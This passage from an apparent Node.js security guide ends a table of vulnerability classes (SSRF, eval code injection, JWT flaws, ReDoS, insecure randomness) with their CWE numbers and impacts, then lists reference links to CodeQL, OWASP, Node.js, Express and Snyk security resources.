| 6 | SSRF | CWE-918 | Internal access |
| 7 | Code Injection (eval) | CWE-94 | Code execution |
| 8 | JWT Issues | CWE-347 | Auth bypass |
| 9 | ReDoS | CWE-1333 | Denial of service |
| 10 | Insecure Randomness | CWE-330 | Token prediction |

---

## References

- [CodeQL JavaScript Queries](https://github.com/github/codeql/tree/main/javascript/ql/src)
- [OWASP Node.js Security](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [Snyk JavaScript Security](https://snyk.io/blog/javascript-security/)
